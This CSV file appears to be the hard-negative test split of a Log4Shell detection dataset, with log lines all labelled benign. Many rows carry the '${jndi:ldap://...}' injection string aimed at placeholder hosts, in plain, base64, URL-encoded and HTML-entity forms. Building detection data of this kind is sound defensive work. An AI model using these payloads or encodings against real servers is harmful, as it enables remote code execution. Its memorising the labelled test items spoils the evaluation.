id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-004153,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://training.local/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0000,info escaped_code_sample value='\${jndi:ldap://training.local/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0000,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004154,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0001","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0001",0,benign,benign_keyword_only,mixed,hard_negative_test,low
LS-004155,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0002,assert literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0002,0,benign,benign_unit_test_fixture,mixed,hard_negative_test,low
LS-004156,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fdefensive-lab.example%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-hard_negative_test-0003,get /kb/log4shell?sample=${jndi:ldap://defensive-lab.example/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-hard_negative_test-0003,0,benign,benign_encoded_documentation,mixed,hard_negative_test,low
LS-004157,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://sample.invalid/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0004,assert literal_payload_string equals '${jndi:ldap://sample.invalid/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0004,0,benign,benign_unit_test_fixture,mixed,hard_negative_test,low
LS-004158,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0005","info json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0005",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004159,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://docs.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0006,security_review indicator_sample='${jndi:ldap://docs.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0006,0,benign,benign_scanner_report,mixed,hard_negative_test,low
LS-004160,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;training.local&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0007,get /preview?html=${jndi:ldap://training.local/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0007,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004161,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://training.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0008,security_review indicator_sample='${jndi:ldap://training.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0008,0,benign,benign_scanner_report,mixed,hard_negative_test,low
LS-004162,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9kb2NzLmV4YW1wbGUvc2FtcGxlfQ== action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0009,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9kb2nzlmv4yw1wbguvc2ftcgxlfq== action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0009,0,benign,benign_base64_artifact,mixed,hard_negative_test,low
LS-004163,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fsample.invalid%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-hard_negative_test-0010,get /kb/log4shell?sample=${jndi:ldap://sample.invalid/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-hard_negative_test-0010,0,benign,benign_encoded_documentation,mixed,hard_negative_test,low
LS-004164,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;kb.internal&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0011,get /preview?html=${jndi:ldap://kb.internal/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0011,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004165,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Ftraining.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-hard_negative_test-0012,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002ftraining.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-hard_negative_test-0012,0,benign,benign_percent_u_documentation,mixed,hard_negative_test,low
LS-004166,2026-05-17,hard_negative,User searched for Log4j mitigation guide trace_id=hardneg-hard_negative_test-0013,user searched for log4j mitigation guide trace_id=hardneg-hard_negative_test-0013,0,benign,keyword_only,mixed,hard_negative_test,low
LS-004167,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://sample.invalid/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0014,security_review indicator_sample='${jndi:ldap://sample.invalid/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0014,0,benign,benign_scanner_report,mixed,hard_negative_test,low
LS-004168,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'kb.internal' are shown separately for awareness trace_id=hardneg-hard_negative_test-0015,training note tokens '$' '{' 'jndi' ':ldap://' 'kb.internal' are shown separately for awareness trace_id=hardneg-hard_negative_test-0015,0,benign,benign_fragmented_tutorial_text,mixed,hard_negative_test,low
LS-004169,2026-05-17,hard_negative,User searched for Log4j mitigation guide trace_id=hardneg-hard_negative_test-0016,user searched for log4j mitigation guide trace_id=hardneg-hard_negative_test-0016,0,benign,keyword_only,mixed,hard_negative_test,low
LS-004170,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9zYW1wbGUuaW52YWxpZC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0017,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9zyw1wbguuaw52ywxpzc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0017,0,benign,benign_base64_artifact,mixed,hard_negative_test,low
LS-004171,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://training.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0018,security_review indicator_sample='${jndi:ldap://training.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0018,0,benign,benign_scanner_report,mixed,hard_negative_test,low
LS-004172,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fplaybook.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-hard_negative_test-0019,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fplaybook.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-hard_negative_test-0019,0,benign,benign_percent_u_documentation,mixed,hard_negative_test,low
LS-004173,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'training.local' are shown separately for awareness trace_id=hardneg-hard_negative_test-0020,training note tokens '$' '{' 'jndi' ':ldap://' 'training.local' are shown separately for awareness trace_id=hardneg-hard_negative_test-0020,0,benign,benign_fragmented_tutorial_text,mixed,hard_negative_test,low
LS-004174,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdocs.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-hard_negative_test-0021,get /docs/search?q=${jndi:ldap://docs.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-hard_negative_test-0021,0,benign,benign_encoded_search_query,mixed,hard_negative_test,low
LS-004175,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://kb.internal/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0022,info markdown_code_block value='${jndi:ldap://kb.internal/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0022,0,benign,benign_documentation_example,mixed,hard_negative_test,low
LS-004176,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0023","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0023",0,benign,benign_keyword_only,mixed,hard_negative_test,low
LS-004177,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0024,info markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0024,0,benign,benign_documentation_example,mixed,hard_negative_test,low
LS-004178,2026-05-17,hard_negative,Security scanner report mentions escaped example \${jndi:ldap://example.com/a} trace_id=hardneg-hard_negative_test-0025,security scanner report mentions escaped example \${jndi:ldap://example.com/a} trace_id=hardneg-hard_negative_test-0025,0,benign,escaped_payload,mixed,hard_negative_test,low
LS-004179,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdocs.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-hard_negative_test-0026,get /docs/search?q=${jndi:ldap://docs.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-hard_negative_test-0026,0,benign,benign_encoded_search_query,mixed,hard_negative_test,low
LS-004180,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://training.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0027,security_review indicator_sample='${jndi:ldap://training.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0027,0,benign,benign_scanner_report,mixed,hard_negative_test,low
LS-004181,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'sample.invalid' are shown separately for awareness trace_id=hardneg-hard_negative_test-0028,training note tokens '$' '{' 'jndi' ':ldap://' 'sample.invalid' are shown separately for awareness trace_id=hardneg-hard_negative_test-0028,0,benign,benign_fragmented_tutorial_text,mixed,hard_negative_test,low
